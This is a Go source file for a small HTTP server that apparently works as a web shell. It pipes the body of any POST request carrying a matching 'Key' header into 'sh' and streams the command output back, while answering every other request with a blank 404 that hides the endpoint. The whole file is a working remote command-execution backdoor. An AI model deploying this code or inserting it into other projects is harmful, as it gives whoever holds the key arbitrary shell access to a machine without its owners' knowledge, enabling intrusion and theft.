package main

import (
	"context"
	"fmt"
	"net/http"
	"os"
	"os/exec"
	"time"
)

func main() {
	port := os.Getenv("PORT")
	if port == "" {
		port = "8080"
	}

	panic(http.ListenAndServe(":"+port, http.HandlerFunc(handler)))
}

func handler(w http.ResponseWriter, r *http.Request) {
	if key := os.Getenv("KEY"); key == "" || key != r.Header.Get("Key") {
		http.Error(w, "", http.StatusNotFound)
		return
	}

	if r.Method != http.MethodPost {
		http.Error(w, "", http.StatusMethodNotAllowed)
		return
	}

	flusherDone := make(chan struct{})
	defer func() { <-flusherDone }()

	ctx, cancel := context.WithCancel(r.Context())
	defer cancel()

	w.WriteHeader(http.StatusOK)

	rc := http.NewResponseController(w)
	go func() {
		defer func() { close(flusherDone) }()
		for {
			select {
			case <-ctx.Done():
				return
			case <-time.After(500 * time.Millisecond):
				rc.Flush()
			}
		}
	}()

	cmd := exec.CommandContext(ctx, "sh")
	cmd.Stdin, cmd.Stdout, cmd.Stderr = r.Body, w, w

	err := cmd.Run()
	if err != nil {
		fmt.Fprintf(w, "\n>>>>>> error on cmd.Run(): %s\n", err.Error())
	}
}
